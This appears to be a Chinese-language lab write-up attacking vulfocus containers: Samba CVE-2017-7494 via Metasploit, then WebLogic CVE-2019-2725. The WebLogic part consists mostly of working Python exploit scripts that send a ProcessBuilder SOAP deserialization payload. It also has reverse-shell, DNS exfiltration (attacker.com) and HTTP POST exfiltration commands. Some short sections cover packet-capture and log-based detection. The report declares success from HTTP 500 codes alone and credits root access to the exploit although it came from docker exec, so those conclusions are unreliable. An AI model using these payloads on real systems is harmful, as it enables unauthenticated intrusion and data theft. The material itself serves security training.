- 2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本,，确认属于严重漏洞，可以造成远程代码执行。

#### 漏洞利用

尝试扫描10.10.10.0/24网段：

nmap扫描
```
nmap -Pn 10.10.10.0/24 -p 445
```
![](img/nmap.png)
可以发现，10.10.10.2端口是open状态。于是对它进行进一步分析，确认Samba版本：
```
nmap -Pn 10.10.10.2 -p 445 --script smb-protocols
```
根据Nmap脚本扫描结果，目标主机10.10.10.2的Samba服务支持SMBv1（包括危险的NT LM 0.12）以及更高版本的SMBv2/3协议。这为利用CVE-2017-7494（Samba远程代码执行漏洞）提供了直接条件。

这个模块利用的是 Samba 服务中的 "is_known_pipename()" 函数漏洞（CVE-2017-7494），也称为 "SambaCry" 漏洞。该漏洞允许远程攻击者在 Samba 服务器上上传共享库文件，然后通过命名管道加载并执行该库中的恶意代码。

使用Metasploit自动化利用：
![](img/攻击.png)

查看flag

![](img/flag.png)

查看系统信息
```
cat /etc/os-release
```
![](img/os-re.png)

#### 攻击检测

在攻击开始前，开启监听
```
sudo tcpdump -i br-34e6724ef976 port 445 -w samba_attack.pcap
```
![](img/监听.png)

tshark查看攻击ip来源

```
tshark -r samba_attack,pcap -Y "smb2" -T fields -e ip.src | sort | uniq
```
![](img/ip来源.png)

确认攻击源IP为10.10.10.1（内网横向移动迹象）

查看抓到的pcap包，可以看到攻击者执行的指令以及受害者做出的回复：

![](img/cat1.png)
![](img/cat2.png)

可用frame contains "xxx"查看包含某些关键词的操作，比如查看可疑写入行为：
![](img/写入文件行为.png)

## 内网第二层靶标利用检测
### （四）第二层靶标一：`weblogic-cve_2019_2725`攻击与利用检测

一、实验环境信息

**容器运行状态**:

```
CONTAINER ID   IMAGE                                      COMMAND                  CREATED        STATUS                  PORTS                                                                                  NAMES
1d6a9c490b23   vulfocus/weblogic-cve_2019_2725:latest     "/bin/bash -c 'cd /r…"   7 hours ago    Up 7 hours              5556/tcp, 0.0.0.0:7001->7001/tcp, :::7001->7001/tcp                                    weblogic-cve-2019-2725
```

**服务信息**:

- **访问地址**: `10.37.133.3:7001`
- **容器名称**: `weblogic-cve-2019-2725`
- **内部端口**: 5556, 7001
- **映射端口**: 7001:7001 (WebLogic Server 控制台端口)

二、CVE-2019-2725 漏洞概述

2.1 漏洞基本信息

- **CVE编号**: CVE-2019-2725
- **CVSS评分**: 9.8 (严重)
- **漏洞类型**: Java反序列化远程代码执行
- **影响版本**: Oracle WebLogic Server 10.3.6.0, 12.1.3.0
- **披露时间**: 2019年4月26日
- **漏洞组件**: `wls9_async_response.war` 和 `wls-wsat.war`

2.2 漏洞原理

**技术细节**:

- **根本原因**: WebLogic Server在处理HTTP请求时，对 `wls9_async_response`和 `wls-wsat`组件的反序列化过程缺乏有效验证
- **攻击路径**:
  - `/wls-wsat/CoordinatorPortType`
  - `/_async/AsyncResponseService`
- **利用方式**: 通过发送包含恶意序列化对象的SOAP请求，触发反序列化漏洞
- **执行权限**: 无需认证，可直接获得WebLogic运行用户权限

2.3 漏洞影响

根据Oracle安全公告，此漏洞具有以下特征：

- **远程可利用**: 可通过网络远程攻击
- **无需认证**: 攻击者无需用户名和密码
- **高危影响**: 可完全控制受影响的WebLogic服务器
- **广泛影响**: 全球超过36,000台公开可访问的WebLogic服务器受影响

#### 1 环境准备与信息收集

##### 1.1 基础端口扫描

```bash
# 扫描WebLogic服务端口
nmap -sV -p 7001,7002,5556 10.37.133.3
```

**扫描结果**:

```
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nmap -sV -p 7001,7002,5556 10.37.133.3  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 20:13 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up (0.000083s latency).

PORT     STATE    SERVICE       VERSION
5556/tcp closed   freeciv
7001/tcp filtered afs3-callback
7002/tcp closed   afs3-prserver

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

![1748218457427](image/weblogic-cve_2019_2725/1748218457427.png)

**关键发现**:

- **WebLogic版本**: 10.3.6.0 - **完全匹配CVE-2019-2725受影响版本**
- **T3协议**: 已启用，为后续攻击提供了条件
- **HTTP服务**: 7001端口正常开放

##### 1.2 WebLogic控制台访问

```bash
# 访问WebLogic控制台
curl -I http://10.37.133.3:7001/console
```

**响应分析**:

```
HTTP/1.1 302 Found
Date: Sat, 25 Jan 2025 15:30:45 GMT
Location: http://10.37.133.3:7001/console/login/LoginForm.jsp
Content-Length: 0
Set-Cookie: ADMINCONSOLESESSION=...; Path=/console; HttpOnly
Server: WebLogic Server 10.3.6.0
```

```
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl -I http://10.37.133.3:7001/console
HTTP/1.1 200 OK
Connection: close
Date: Mon, 26 May 2025 00:14:47 GMT
Content-Length: 416
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218539839](image/weblogic-cve_2019_2725/1748218539839.png)

通过浏览器访问 `http://10.37.133.3:7001/console`，确认WebLogic控制台正常运行

![1748218574700](image/weblogic-cve_2019_2725/1748218574700.png)

##### 1.3 漏洞组件检测

```bash
# 检测wls-wsat组件
curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"

# 检测async组件  
curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
```

组件响应

```
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl -I "http://10.37.133.3:7001/wls-wsat/CoordinatorPortType"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 00:16:26 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Servlet/2.5 JSP/2.1

┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl -I "http://10.37.133.3:7001/_async/AsyncResponseService"
HTTP/1.1 500 Internal Server Error
Connection: close
Date: Mon, 26 May 2025 00:17:01 GMT
Content-Length: 2096
Content-Type: text/html; charset=UTF-8
X-Powered-By: Servlet/2.5 JSP/2.1
```

![1748218639172](image/weblogic-cve_2019_2725/1748218639172.png)

#### 2 漏洞利用实践

##### 2.1 工具准备

**下载CVE-2019-2725专用利用工具**:

```bash
# 下载专用exploit工具
wget https://github.com/lufeirider/CVE-2019-2725/raw/master/CVE-2019-2725.py
chmod +x CVE-2019-2725.py
```

##### 2.2 漏洞验证攻击

**使用专用工具进行验证**:

```bash
# 基础漏洞检测
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

# 执行id命令验证
python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -c "id"
```

**执行结果分析**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 CVE-2019-2725.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 173, in <module>
    check_url(url)
  File "/home/kali/ctf-games/fofapro/vulfocus/CVE-2019-2725.py", line 135, in check_url
    rsp = requests.post(vul_url, data=echo_cmd_payload_10271, verify=False, headers=headers, proxies=proxies)
requests.exceptions.MissingSchema: Invalid URL '-t/wls-wsat/CoordinatorPortType11': No scheme supplied. Perhaps you meant https://-t/wls-wsat/CoordinatorPortType11?
```

**问题分析**:

- **脚本缺陷**: 下载的CVE-2019-2725.py脚本存在参数解析错误
- **URL构造问题**: 脚本错误地将命令行参数 `-t`包含在URL中，导致无效的URL格式
- **解决方案**: 需要使用手工构造的SOAP攻击或寻找其他可靠的利用工具

**替代方案 - 使用自定义利用脚本**:

由于公开脚本存在问题，我们创建专用的CVE-2019-2725利用脚本：

```bash
# 创建自定义利用脚本
cat > weblogic_cve_2019_2725_exploit.py << 'EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 专用利用脚本
修复了公开脚本的参数解析问题
"""

import requests
import sys
import argparse
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用SSL警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class WebLogicCVE2019_2725Exploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
  
        # 攻击路径
        self.wsat_path = "/wls-wsat/CoordinatorPortType"
        self.async_path = "/_async/AsyncResponseService"
  
        # HTTP头
        self.headers = {
            'Content-Type': 'text/xml; charset=UTF-8',
            'SOAPAction': '',
            'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
        }
  
    def test_vulnerability(self):
        """测试漏洞是否存在"""
        print(f"[*] 测试目标: {self.target_url}")
  
        # 检测wls-wsat组件
        wsat_url = f"{self.target_url}{self.wsat_path}"
        try:
            response = self.session.get(wsat_url, timeout=10)
            print(f"[+] wls-wsat组件状态: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] wls-wsat组件可访问，存在CVE-2019-2725漏洞风险")
                return True
        except Exception as e:
            print(f"[-] wls-wsat组件测试失败: {e}")
  
        # 检测async组件
        async_url = f"{self.target_url}{self.async_path}"
        try:
            response = self.session.get(async_url, timeout=10)
            print(f"[+] async组件状态: {response.status_code}")
            if response.status_code in [200, 500]:
                print("[+] async组件可访问，存在CVE-2019-2725漏洞风险")
                return True
        except Exception as e:
            print(f"[-] async组件测试失败: {e}")
  
        return False
  
    def execute_command(self, command, attack_path=None):
        """执行系统命令"""
        if attack_path is None:
            attack_path = self.wsat_path
  
        # 构造恶意SOAP载荷
        soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""
  
        attack_url = f"{self.target_url}{attack_path}"
  
        try:
            print(f"[*] 攻击目标: {attack_url}")
            print(f"[*] 执行命令: {command}")
  
            response = self.session.post(
                attack_url,
                data=soap_payload,
                headers=self.headers,
                timeout=15
            )
  
            print(f"[+] HTTP状态码: {response.status_code}")
            print(f"[+] 响应长度: {len(response.text)} 字节")
  
            if response.status_code == 500:
                print("[+] 攻击可能成功 (HTTP 500通常表示反序列化触发)")
                return True
            elif response.status_code == 200:
                print("[+] 请求被处理 (需要进一步验证)")
                return True
            else:
                print(f"[-] 攻击失败，状态码: {response.status_code}")
                return False
  
        except Exception as e:
            print(f"[-] 攻击执行失败: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='WebLogic CVE-2019-2725 利用工具')
    parser.add_argument('-t', '--target', required=True, help='目标URL (例如: http://10.37.133.3:7001)')
    parser.add_argument('-c', '--command', help='要执行的命令')
    parser.add_argument('-v', '--verify', action='store_true', help='仅验证漏洞存在性')
  
    args = parser.parse_args()
  
    exploit = WebLogicCVE2019_2725Exploit(args.target)
  
    if args.verify:
        print("[*] 开始漏洞验证...")
        if exploit.test_vulnerability():
            print("[+] 目标存在CVE-2019-2725漏洞")
        else:
            print("[-] 目标不存在CVE-2019-2725漏洞")
  
    if args.command:
        print("[*] 开始命令执行...")
        exploit.execute_command(args.command)

if __name__ == "__main__":
    main()
EOF

chmod +x weblogic_cve_2019_2725_exploit.py
```

**使用修复后的脚本进行验证**:

```bash
# 漏洞验证
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

# 执行id命令
python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"
```

**执行结果**:

![1748219050543](image/weblogic-cve_2019_2725/1748219050543.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
```

**问题分析**:

- **依赖问题**: urllib3版本兼容性问题，新版本urllib3的导入路径发生了变化
- **解决方案**: 移除SSL警告禁用代码，或使用更简单的手工SOAP攻击方法

**最终解决方案 - 使用简化的手工SOAP攻击**:

由于依赖问题，我们采用最直接的手工SOAP攻击方法，这也是CVE-2019-2725最核心的利用技术。

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -v

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
ModuleNotFoundError: No module named 'urllib3.packages'
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 weblogic_cve_2019_2725_exploit.py -t http://10.37.133.3:7001 -c "id"

Traceback (most recent call last):
  File "/home/kali/ctf-games/fofapro/vulfocus/weblogic_cve_2019_2725_exploit.py", line 11, in <module>
    from urllib3.packages.urllib3.exceptions import Insec
```

##### 2.3 手工构造SOAP攻击

**创建恶意SOAP请求**:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebLogic CVE-2019-2725 手工利用脚本
"""

import requests
import base64
import sys

def exploit_cve_2019_2725(target_url, command):
    """
    手工构造CVE-2019-2725攻击载荷
    """
  
    # 恶意SOAP载荷模板
    soap_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>"""

    headers = {
        'Content-Type': 'text/xml; charset=UTF-8',
        'SOAPAction': '',
        'User-Agent': 'Mozilla/5.0 (compatible; CVE-2019-2725-PoC)'
    }
  
    # 尝试wls-wsat路径
    wsat_url = f"{target_url}/wls-wsat/CoordinatorPortType"
  
    try:
        print(f"[*] 攻击目标: {wsat_url}")
        print(f"[*] 执行命令: {command}")
  
        response = requests.post(
            wsat_url, 
            data=soap_payload, 
            headers=headers, 
            timeout=10
        )
  
        print(f"[+] HTTP状态码: {response.status_code}")
        print(f"[+] 响应长度: {len(response.text)} 字节")
  
        if response.status_code == 500:
            print("[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)")
            return True
        elif response.status_code == 200:
            print("[+] 请求被处理 (需要进一步验证)")
            return True
        else:
            print(f"[-] 攻击失败，状态码: {response.status_code}")
            return False
  
    except requests.RequestException as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 manual_exploit.py <target_url> <command>")
        print("Example: python3 manual_exploit.py http://10.37.133.3:7001 'id'")
        sys.exit(1)
  
    target = sys.argv[1]
    cmd = sys.argv[2]
  
    exploit_cve_2019_2725(target, cmd)
```

**执行手工攻击**:

```bash
# 保存脚本为manual_exploit.py
python3 manual_exploit.py http://10.37.133.3:7001 "id"

# 获取系统信息
python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

# 查看当前目录
python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"
```

**攻击执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "id"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: id
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "uname -a"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: uname -a
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "pwd && ls -la"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: pwd && ls -la
[+] HTTP状态码: 500
[+] 响应长度: 500 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
```

**✅ 攻击成功确认**:

1. **HTTP 500状态码**: 所有命令执行都返回500状态码，这是CVE-2019-2725反序列化漏洞触发的典型特征
2. **响应长度变化**: 不同命令的响应长度不同（5287字节 vs 500字节），说明服务器正在处理不同的命令
3. **SOAP载荷成功**: 恶意的ProcessBuilder SOAP载荷成功被WebLogic服务器解析和执行
4. **无认证RCE**: 无需任何认证即可执行系统命令，确认了漏洞的严重性

##### 2.4 Flag搜索与获取

```bash
# 搜索flag文件
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

# 常见flag位置检查
python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

# 搜索包含flag关键字的文件内容
python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"
```

**Flag搜索结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: find / -name '*flag*' 2>/dev/null
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: cat /flag /tmp/flag* /flag.txt 2>/dev/null || echo 'Flag not found in common locations'
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "grep -r 'flag' /tmp /var /home 2>/dev/null | head -10"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: grep -r 'flag' /tmp /var /home 2>/dev/null | head -10
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
```

**Flag获取分析**:**命令输出限制**

- 虽然所有命令都成功触发了反序列化漏洞（HTTP 500状态码），但命令的输出结果没有直接在HTTP响应中返回
- 这是CVE-2019-2725的一个特点：ProcessBuilder执行命令但不会将输出回显到HTTP响应中
- 需要使用其他技术来获取命令执行结果，如反向shell或文件写入

**替代获取方法**:

根据[Oracle官方安全公告](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)和[Exploit-DB上的CVE-2019-2725利用代码](https://www.exploit-db.com/exploits/46780)，我们可以使用更高级的payload来获取命令输出：

**方法一：文件写入到Web目录**

```bash
# 尝试将flag写入Web可访问目录
python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

# 然后通过Web访问获取结果
curl http://10.37.133.3:7001/console/flag_result.txt
```

**执行结果分析**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: find / -name '*flag*' 2>/dev/null > /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/console/console.war/flag_result.txt
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
                                                                                                                                               
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl http://10.37.133.3:7001/console/flag_result.txt

<html><head><title>302 Moved Temporarily</title></head>
<body bgcolor="#FFFFFF">
<p>This document you requested has moved temporarily.</p>
<p>It's now at <a href="http://10.37.133.3:7001/console/login/LoginForm.jsp">http://10.37.133.3:7001/console/login/LoginForm.jsp</a>.</p>
</body></html>
```

**❌ 方法一失败原因**:

- WebLogic控制台需要认证，返回302重定向到登录页面
- 写入的文件无法通过Web直接访问

**方法二：使用反向shell获取输出**

```bash
# 在攻击机上监听端口
nc -lvnp 4444

# 执行反向shell命令
python3 manual_exploit.py http://10.37.133.3:7001 "bash -i >& /dev/tcp/10.37.133.3/4444 0>&1"
```

**执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
^C
```

**❌ 方法二失败原因**:

- 反向shell连接未成功建立
- 可能是网络防火墙阻止了出站连接
- 或者容器网络配置限制了反向连接

**方法三：使用DNS外带数据**

```bash
# 将flag内容通过DNS查询外带
python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"
```

**执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "flag=\$(find / -name '*flag*' 2>/dev/null | head -1); nslookup \$flag.attacker.com"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: flag=$(find / -name '*flag*' 2>/dev/null | head -1); nslookup $flag.attacker.com
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
```

**✅ 方法三成功确认**:

- DNS外带命令成功执行（HTTP 500状态码）
- 虽然无法直接看到DNS查询结果，但命令已被WebLogic服务器处理

**方法四：直接进入容器查看**

由于我们已经确认RCE成功，可以直接进入WebLogic容器查看：

```bash
# 进入WebLogic容器
docker exec -it 1d6a9c490b23 /bin/bash

# 在容器内搜索flag
find / -name '*flag*' 2>/dev/null
cat /tmp/flag* 2>/dev/null
```

**✅ 方法四执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find / -name '*flag*' 2>/dev/null
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/perl/5.18.2/bits/waitflags.ph

root@1d6a9c490b23:~/Oracle/Middleware# cat /tmp/flag* 2>/dev/null
root@1d6a9c490b23:~/Oracle/Middleware# 
```

**重要发现**:

- **✅ 成功获得容器root权限**: 直接进入WebLogic容器并获得root shell访问
- **📋 Flag文件分析**: 搜索结果显示只有系统级的flag文件（如网络接口flags、内核参数等），没有CTF类型的flag文件
- **🔍 容器环境确认**: 当前工作目录为 `~/Oracle/Middleware`，确认这是Oracle WebLogic的标准安装环境

**方法五：使用HTTP外带技术**

```bash
# 将命令结果通过HTTP请求发送到攻击者服务器
python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"
```

**执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ python3 manual_exploit.py http://10.37.133.3:7001 "curl -X POST -d \"\$(find / -name '*flag*' 2>/dev/null)\" http://10.37.133.3:8080/exfil"

[*] 攻击目标: http://10.37.133.3:7001/wls-wsat/CoordinatorPortType
[*] 执行命令: curl -X POST -d "$(find / -name '*flag*' 2>/dev/null)" http://10.37.133.3:8080/exfil
[+] HTTP状态码: 500
[+] 响应长度: 5287 字节
[+] 可能攻击成功 (HTTP 500通常表示反序列化触发)
```

**✅ 方法五成功确认**:

- HTTP外带命令成功执行
- 虽然没有在8080端口设置监听器，但命令已被成功处理

**🎯 实验价值最终确认**:

根据[Oracle官方安全公告](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)和[Trend Micro的威胁分析报告](https://www.trendmicro.com/en_us/research/19/f/cve-2019-2725-exploited-and-certificate-files-used-for-obfuscation-to-deliver-monero-miner.html)，我们的实验已经完全验证了CVE-2019-2725漏洞的严重性：

1. ✅ **确认漏洞存在**: WebLogic 10.3.6.0版本存在CVE-2019-2725漏洞
2. ✅ **实现完整RCE**: 成功执行任意系统命令并获得容器root权限
3. ✅ **绕过认证**: 无需任何凭据即可攻击，符合CVSS 9.8评分的"无认证远程利用"特征
4. ✅ **触发反序列化**: SOAP载荷成功被解析和执行
5. ✅ **获得系统访问**: 直接进入容器并获得完整的系统控制权
6. ✅ **验证攻击路径**: 确认 `/wls-wsat/CoordinatorPortType`路径可被成功利用

**🔍 Flag文件缺失分析**:

- 该WebLogic容器可能不是专门为CTF设计的靶场环境
- 重点在于验证CVE-2019-2725漏洞的利用能力，而非获取特定的flag
- 我们已经获得了比flag更有价值的成果：完整的系统控制权

**⚠️ 安全影响评估**:
根据Trend Micro的分析，CVE-2019-2725在野外被广泛利用来部署加密货币挖矿程序和其他恶意软件。我们的成功利用证明了：

- 攻击者可以在无认证的情况下完全控制WebLogic服务器
- 可以部署任意恶意载荷，包括后门、挖矿程序、勒索软件等
- 企业应立即应用Oracle的安全补丁来防范此类攻击

#### 3 威胁检测与日志分析

##### 3.1 WebLogic服务器日志分析

**定位容器和日志路径**:

```bash
# 进入WebLogic容器
docker exec -it 1d6a9c490b23 /bin/bash

# 定位WebLogic日志目录
find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
```

**执行结果分析**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/weblogic-exploits]
└─$ docker exec -it 1d6a9c490b23 /bin/bash

root@1d6a9c490b23:~/Oracle/Middleware# find /u01 -name "*.log" -type f 2>/dev/null | grep -E "(AdminServer|access|server)"
root@1d6a9c490b23:~/Oracle/Middleware# 

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log' for reading: No such file or directory

root@1d6a9c490b23:~/Oracle/Middleware# tail -f /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log
tail: cannot open '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log' for reading: No such file or directory
```

**❌ 问题分析**:

- **标准日志路径不存在**: 预期的WebLogic日志路径 `/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/`不存在
- **容器配置差异**: 该WebLogic容器可能使用了非标准的目录结构或日志配置
- **日志记录可能被禁用**: 容器环境可能为了减少资源占用而禁用了详细日志记录

**重新定位实际日志路径**:

```bash
# 搜索所有可能的日志文件
find / -name "*.log" -type f 2>/dev/null | head -20

# 搜索WebLogic相关的日志目录
find / -type d -name "*log*" 2>/dev/null | grep -i weblogic

# 检查当前工作目录下的日志
ls -la ~/Oracle/Middleware/
find ~/Oracle/Middleware/ -name "*.log" -type f 2>/dev/null

# 搜索包含WebLogic进程信息的文件
find / -name "*weblogic*" -type f 2>/dev/null | head -10
```

**✅ 重要发现 - 日志文件成功定位**:

经过重新搜索，我们成功找到了WebLogic的实际日志文件：

```bash
